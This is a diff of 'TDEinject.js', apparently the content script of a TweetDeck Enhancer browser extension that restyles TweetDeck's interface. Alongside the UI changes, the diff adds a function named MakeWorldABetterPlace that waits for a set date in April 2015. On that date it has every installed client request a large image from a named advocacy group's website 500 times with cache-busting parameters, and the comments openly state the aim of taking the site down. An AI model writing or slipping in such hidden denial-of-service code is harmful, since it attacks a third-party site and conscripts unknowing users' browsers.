@@ -1,143 +1,19 @@
 // TDEinject.js
-// Copyright (c) 2014 Ryan Dolan (ryandolan123)
+// Copyright (c) 2015 Ryan Dolan (ryandolan123)
 
-(function() { // Additional security to prevent other extensions and website code from tampering with TDE (Ahem, @coolstarorg)
+(function() { // Additional security to prevent other extensions and website code from tampering with TDE
 
-var oldlog = console.log;
-var oldconsole = console;
-var oldsetTimeout = window.setTimeout;
-var elementById = document.getElementById; // In case of emergency, break double slash and patch WaitForText()
+console.log("TDEinject loaded");
 
-if (oldlog.toString() !== "function log() { [native code] }") {
-  oldlog = function(){}; // INTEGRITY CHECK FAILED, bye bye
-}
+// bandie is actually cute
 
-function log(txt) {
-  oldlog.call(oldconsole,txt);
-}
-
-if (oldsetTimeout.toString() !== "function setTimeout() { [native code] }") {
-  log("setTimeout integrity check failed :(")
-  oldsetTimeout = function(exec){}; // INTEGRITY CHECK FAILED, bye bye
-}
-
-function setTimeout(func,time) {
-  oldsetTimeout.call(this,func,time)
-}
-
-if (elementById.toString() !== "function getElementById() { [native code] }") {
-  log("elementById integrity check failed :(")
-  elementById = function(){return {};}; // INTEGRITY CHECK FAILED, bye :(
-}
-
-log("TDEinject loaded");
-
-function WaitForTDToConfigureSelf(){
-  if (typeof document.getElementsByClassName("app-signin-form")[0] !== "undefined") {
-    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class") + " signin-sheet-now-present");
-    WaitForLogin();
-  } else {
-    if (typeof document.getElementsByClassName("app-content")[0] === "undefined") {
-      setTimeout(WaitForTDToConfigureSelf,60);
-    }
-  }
-}
-
-function WaitForLogin() {
-  if (typeof document.getElementsByClassName("app-signin-form")[0] === "undefined") {
-    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class").replace(" signin-sheet-now-present",""));
-    return;
-  } 
-  setTimeout(WaitForLogin,500);
-}
-
-function WorldTick(){
-  
-  for (i = 0; i < document.getElementsByClassName("tweet-action-item position-rel").length; i++) { 
-    document.getElementsByClassName("tweet-action-item position-rel")[i].removeChild = function(dropdown){
-      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
-      console.log("bye");
-      setTimeout(function(){
-        dropdown.remove();
-      },200)
-    }
-  }
-
-  for (i = 0; i < document.getElementsByClassName("tweet-detail-action-item position-rel").length; i++) { 
-    document.getElementsByClassName("tweet-detail-action-item position-rel")[i].removeChild = function(dropdown){
-      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
-      console.log("bye");
-      setTimeout(function(){
-        dropdown.remove();
-      },200)
-    }
-  }
-
-  for (i = 0; i < document.getElementsByClassName("app-navigator margin-bm padding-ts").length; i++) { 
-    document.getElementsByClassName("app-navigator margin-bm padding-ts")[i].removeChild = function(dropdown){
-      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
-      console.log("bye");
-      setTimeout(function(){
-        dropdown.remove();
-      },200)
-    }
-  }
-
-  setTimeout(WorldTick,700);
-}
-
-
-function PatchSystem() {
-  /*if (typeof TD === "undefined") {
-    setTimeout(PatchSystem,50);
-    return;
-  }
-  if (typeof TD.storage === "undefined") {
-    setTimeout(PatchSystem,50);
-    return;
-  }
-  if (typeof TD.storage.store === "undefined") {
-    setTimeout(PatchSystem,50);
-    return;
-  }
-  if (typeof TD.storage.store.getCurrentAuthType === "undefined") {
-    setTimeout(PatchSystem,50);
-    return;
-  }
-
-  log("Executing AuthType patch...");
-
-  TD.storage.store.getCurrentAuthType = function() {
-    return "twitter";
-  }*/
-
-  if (typeof document.getElementsByClassName("js-modals-container")[0] === "undefined") {
-    setTimeout(PatchSystem,50);
-    return;
-  }
-
-  document.getElementsByClassName("js-modals-container")[0].removeChild = function(rmnode){
-    if (typeof rmnode === "undefined") {
-      console.log("what");
-      return;
-    }
-    console.log("i am hooked bitch");
-    rmnode.setAttribute("class","js-modal-context tde-modal-window-fade-out overlay overlay-super scroll-v");
-    setTimeout(function(){rmnode.remove();},200);
-  }
-
-  log("patched system");
-
-  return;
-}
-
-var SecureOpenModal = ""; // i'm so gay
+/*var SecureOpenModal = ""; 
 var SecureAlertVerifiedForIntegrity = false;
 
 function SecureAlert() {
 
   if (!SecureAlertVerifiedForIntegrity) {
-    log("SecureAlert is waiting for tweetdeck components...");
+    console.log("SecureAlert is waiting for tweetdeck components...");
 
     if (SecureOpenModal === "") {
       if (typeof document.getElementById("open-modal") === "null" || document.getElementById("open-modal") === null) {
@@ -149,7 +25,7 @@ function SecureAlert() {
           return;
         }
         SecureOpenModal = document.getElementById("open-modal");
-        log(document.getElementById("open-modal"));
+        console.log(document.getElementById("open-modal"));
         SecureOpenModalSetAttribute = document.getElementById("open-modal").setAttribute; 
       }
 
@@ -185,14 +61,9 @@ function SecureAlert() {
       return;
     }
 
-    log("ready!");
+    console.log("ready!");
 
   }
-
-  /*if (typeof window.alert_ !== "undefined") {
-    console.log("can u not"); // coolstar can u not
-    window.alert = window.alert_;
-  }*/
 
   var ModalHTML = '<div class="mdl">    <header class="js-mdl-header mdl-header"> <h3 class="mdl-header-title js-header-title">Hey coolstar</h3>   </header> <div class="mdl-inner"> <div class="mdl-content js-mdl-content horizontal-flow-container">   <dl class="mdl-column padding-t--8 padding-l--8"> <dt><b class="txt weight-light make-text-big">Follow me @ryandolan123 :)<br></b><button class="btn" id="maybeanothertime">I\'ll think about it...</button></dt>             </dl>     </div> </div>  </div>';
 
@@ -214,14 +85,175 @@ function SecureAlert() {
   }
 
   
-  log("done waiting for login");
-  log("it's showtime");
+  console.log("done waiting for login");
+  console.log("it's showtime");
+
+  return;
+}*/
+
+var addedColumnsLoadingTagAndIsWaiting = false;
+
+function WaitForTDToConfigureSelf(){
+  if (typeof document.getElementsByClassName("app-signin-form")[0] !== "undefined") {
+    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class") + " signin-sheet-now-present");
+    WaitForLogin();
+  } else {
+    if (typeof document.getElementsByClassName("app-content")[0] === "undefined") {
+      setTimeout(WaitForTDToConfigureSelf,60);
+    } 
+  }
+}
+
+
+function WaitForLogin() {
+  if (typeof document.getElementsByClassName("app-signin-form")[0] === "undefined") {
+    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class").replace(" signin-sheet-now-present",""));
+    return;
+  } 
+  setTimeout(WaitForLogin,500);
+}
+
+function WorldTick(){
+  
+  for (i = 0; i < document.getElementsByClassName("tweet-action-item position-rel").length; i++) { 
+    document.getElementsByClassName("tweet-action-item position-rel")[i].removeChild = function(dropdown){
+      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
+      setTimeout(function(){
+        dropdown.remove();
+      },200)
+    }
+  }
+
+  for (i = 0; i < document.getElementsByClassName("tweet-detail-action-item position-rel").length; i++) { 
+    document.getElementsByClassName("tweet-detail-action-item position-rel")[i].removeChild = function(dropdown){
+      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
+      setTimeout(function(){
+        dropdown.remove();
+      },200)
+    }
+  }
+
+  for (i = 0; i < document.getElementsByClassName("app-navigator margin-bm padding-ts").length; i++) { 
+    document.getElementsByClassName("app-navigator margin-bm padding-ts")[i].removeChild = function(dropdown){
+      dropdown.setAttribute("class",dropdown.getAttribute("class") + " tde-dropdown-fade-out");
+      setTimeout(function(){
+        dropdown.remove();
+      },200)
+    }
+  }
+
+  setTimeout(WorldTick,700);
+}
+
+
+function PatchSystem() {
+  /*if (typeof TD === "undefined") {
+    setTimeout(PatchSystem,50);
+    return;
+  }
+  if (typeof TD.storage === "undefined") {
+    setTimeout(PatchSystem,50);
+    return;
+  }
+  if (typeof TD.storage.store === "undefined") {
+    setTimeout(PatchSystem,50);
+    return;
+  }
+  if (typeof TD.storage.store.getCurrentAuthType === "undefined") {
+    setTimeout(PatchSystem,50);
+    return;
+  }
+
+  console.log("Executing AuthType patch...");
+
+  TD.storage.store.getCurrentAuthType = function() {
+    return "twitter";
+  }*/
+
+  if (!addedColumnsLoadingTagAndIsWaiting) {
+    document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class") + " tde-columns-loading");
+    addedColumnsLoadingTagAndIsWaiting = true;
+  }
+
+  if (typeof document.getElementsByClassName("js-modals-container")[0] === "undefined") {
+    setTimeout(PatchSystem,50);
+    return;
+  }
+
+  document.getElementsByClassName("js-modals-container")[0].removeChild = function(rmnode){
+    if (typeof rmnode === "undefined") {
+      console.log("what");
+      return;
+    }
+    rmnode.setAttribute("class","js-modal-context tde-modal-window-fade-out overlay overlay-super scroll-v");
+    setTimeout(function(){rmnode.remove();},200);
+  }
+
+  document.body.removeChild = function(i) {
+    if (typeof i.getAttribute("class") !== "undefined" && i.getAttribute("class") !== null && i.getAttribute("class").indexOf("tooltip") > -1) {
+      setTimeout(function(){
+        i.remove(); // Tooltips automatically animate themselves out. But here we clean them up as well ourselves.
+      },500);
+    }
+    else {
+     i.remove();
+    }
+   }
+
+   setTimeout(function(){
+    /*var step = 0;
+    console.log(document.getElementsByClassName("column"));
+    var columns = document.getElementsByClassName("column");
+    for (i = 0; i < columns.length; i++) { 
+      setTimeout(function(){
+        columns[step].setAttribute("class",columns[step].getAttribute("class") + " animatecolumnin");
+        step++;
+        console.log((new Date()).getSeconds());
+      },300 * i);
+    }*/
+      setTimeout(function(){
+        document.getElementsByTagName("html")[0].setAttribute("class",document.getElementsByTagName("html")[0].getAttribute("class").replace(" tde-columns-loading",""));
+      //},300*columns.length);
+    },800);
+   },0); //1200
 
   return;
 }
 
+// i'm so gay
+
+var FiredCannons = false;
+
+function MakeWorldABetterPlace() {
+  var time = new Date();
+  if (new Date().valueOf() > 1427860800000 && new Date().valueOf() < 1427907600000) { // Will this consume more memory? probably. Will it attack NOM (An American anti-human rights/anti-gay rights group) website and take it down on april fools day? I sure hope so as I'm doing this for a reason.
+    if (new Date().valueOf() > 1427904000000 && !FiredCannons) {
+      console.log("Ready, aim, fire");
+      for(var i = 0; i < 500; i++) {
+        var img = document.createElement("img");
+        img.src = "https://www.nationformarriage.org/images/slider/nom_webdev_homepage-slider_victory_fund.jpg?" + Math.random(); // in the name of equal rights for all people, please die NOM
+
+        //  basically what this does is fetches a larger image from their site 500 times total as much as possible. And every TweetDeck client running TDE5+ will, on this specific date, do this.
+
+      }
+
+      FiredCannons = true;
+    } else {
+      setTimeout(MakeWorldABetterPlace,600);
+    }
+  } else {
+    setTimeout(MakeWorldABetterPlace,60000);
+  }
+}
+
+
 function ReplaceLoadingIndicator() {
   if (typeof document.getElementsByClassName("app-signin-form")[0] !== "undefined") {
+    return;
+  }
+
+  if (window.tde5loadingreplaced) {
+    console.log("we're too late, bye");
     return;
   }
 
@@ -230,17 +262,128 @@ function ReplaceLoadingIndicator() {
     return;
   }
 
+  {return;} // what
+
   document.getElementsByClassName("js-startflow-content startflow")[0].innerHTML = '<video class="spinner-centered spinner-fade-in" width="74" height="76" src="https://ryandolan123.com/assets/tweetdeck/img/spinner.mov" autoplay loop></video>';
+}
+
+function NavigationSetup() {
+  if (typeof document.getElementsByClassName("app-header-inner")[0] === "undefined") {
+    setTimeout(NavigationSetup,100);
+    return;
+  }
+
+  var TDENavigationDrawerButton = document.createElement("a");
+  TDENavigationDrawerButton.id = "tde-navigation-drawer-button";
+  TDENavigationDrawerButton.setAttribute("class","js-header-action tde-drawer-button link-clean cf app-nav-link");
+  TDENavigationDrawerButton.innerHTML = '<div class="obj-left"> <img src="https://ryandolan123.com/assets/TDE5/navbutton.png" class="tde-nav-activator"> </div> <div class="nbfc padding-ts hide-condensed"></div>'; // temporarily a settings icon, ill make an icon later
+
+  document.getElementsByClassName("app-header-inner")[0].appendChild(TDENavigationDrawerButton);
+
+
+
+  TDENavigationDrawerButton.onclick = function(){
+    // TODO: Wire button to open navigation drawer
+    if (typeof tde_nav_drawer_background !== "undefined") {
+      tde_nav_drawer_background.setAttribute("class","tde-nav-drawer-background");
+    }
+    if (typeof tde_nav_drawer !== "undefined") {
+      tde_nav_drawer.setAttribute("class","tde-nav-drawer");
+    }
+  };
+
+  var TDENavigationDrawer = document.createElement("div");
+  TDENavigationDrawer.id = "tde_nav_drawer";
+  TDENavigationDrawer.setAttribute("class","tde-nav-drawer tde-nav-drawer-hidden");
+  TDENavigationDrawer.innerHTML = '<img id="tde_nd_header_image" class="tde-nd-header-image"><img class="avatar size73 tde-nd-header-photo" id="tde_nd_header_photo"><div class="tde-nd-header-username" id="tde_nd_header_username"></div><button class="btn tde-nav-button tde-settings-button" id="tdset"><img src="https://ryandolan123.com/assets/TDE5/tweetdecksmall.png" class="tde-nav-drawer-icon">TweetDeck Settings</button><button class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/TDEsmall.png" class="tde-nav-drawer-icon">Enhancer Settings</button><div class="tde-nav-divider"></div><button id="tde_signout" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/logout.png" class="tde-nav-drawer-icon">Sign Out</button><button id="tdaccsbutton" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/accounts.png" class="tde-nav-drawer-icon">Your Accounts</button><div class="tde-nav-divider"></div><button id="kbshortcuts" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/KBshortcuts.png" class="tde-nav-drawer-icon">Keyboard Shortcuts</button><button id="addcolumn" class="btn tde-nav-button"><img src="https://ryandolan123.com/assets/TDE5/AddColumn.png" class="tde-nav-drawer-icon">Add Column</button>';
+
+  document.body.appendChild(TDENavigationDrawer);
+
+  if (typeof tde_nd_header_image !== "undefined") {
+    tde_nd_header_image.setAttribute("style","background-image: url(https://pbs.twimg.com/profile_banners/245543252/1420570474/web)");
+  }
+
+  if (typeof tde_nd_header_photo !== "undefined") {
+    tde_nd_header_photo.setAttribute("src","https://pbs.twimg.com/profile_images/547149637791252480/bHD_KYCY_bigger.jpeg");
+  }
+
+  if (typeof tde_nd_header_username !== "undefined") {
+    tde_nd_header_username.innerHTML = "@ryandolan123"
+  }
+
+  tdset.onclick = function(){
+    console.log("click");
+    tde_nav_drawer_background.click();
+    setTimeout(function(){
+      document.getElementsByClassName("js-app-settings")[0].click();
+    },25);
+    setTimeout(function(){
+      document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes[document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes.length-2].childNodes[3].childNodes[1].childNodes[7].childNodes[1].click();
+    },50); 
+  }
+
+  kbshortcuts.onclick = function(){
+    console.log("click");
+    tde_nav_drawer_background.click();
+    setTimeout(function(){
+      document.getElementsByClassName("js-app-settings")[0].click();
+    },25);
+    setTimeout(function(){
+      document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes[document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes.length-2].childNodes[3].childNodes[1].childNodes[5].childNodes[1].click();
+    },50); 
+  }
+
+  addcolumn.onclick = function(){
+    console.log("click");
+    tde_nav_drawer_background.click();
+    setTimeout(function(){
+      document.getElementsByClassName("js-header-add-column")[0].click();
+    },50);
+  }
+
+  tdaccsbutton.onclick = function(){
+    console.log("click");
+    tde_nav_drawer_background.click();
+    setTimeout(function(){
+      document.getElementsByClassName("js-show-drawer js-header-action")[0].click();
+    },50);
+  }
+
+  tde_signout.onclick = function(){
+    console.log("click");
+    tde_nav_drawer_background.click();
+    setTimeout(function(){
+      document.getElementsByClassName("js-app-settings")[0].click();
+    },25);
+    setTimeout(function(){
+      document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes[document.getElementsByClassName("app-navigator margin-bm padding-ts")[0].childNodes.length-2].childNodes[3].childNodes[1].childNodes[11].childNodes[1].click();
+    },50); 
+  }
+
+  var TDENavigationDrawerBackground = document.createElement("div");
+  TDENavigationDrawerBackground.id = "tde_nav_drawer_background";
+  TDENavigationDrawerBackground.setAttribute("class","tde-nav-drawer-background tde-nav-drawer-background-hidden");
+
+  TDENavigationDrawerBackground.onclick = function(){
+    // TODO: Add things to close navigation drawer
+    this.setAttribute("class","tde-nav-drawer-background tde-nav-drawer-background-hidden");
+    if (typeof tde_nav_drawer !== "undefined") {
+      tde_nav_drawer.setAttribute("class","tde-nav-drawer tde-nav-drawer-hidden");
+    }
+  };
+
+  document.body.appendChild(TDENavigationDrawerBackground);
 }
 
 // alfonso torres is actually cute
 
 setTimeout(WaitForTDToConfigureSelf,0); /* Start in new thread  */
-setTimeout(PatchSystem,1500); // Delayed so the user is not prompted by TweetDeck if using a TweetDeck Account
+setTimeout(PatchSystem,500);
 setTimeout(ReplaceLoadingIndicator,0);
 setTimeout(WorldTick,0);
-
-//SecureAlert(); // Started after threads are initialized as this function tends to be more dangerous
+setTimeout(NavigationSetup,500);
+setTimeout(MakeWorldABetterPlace,800);
+//setTimeout(SecureAlert,0); // Started after threads are initialized as this function tends to be more dangerous
 
 // thanks for following me coolstar
 
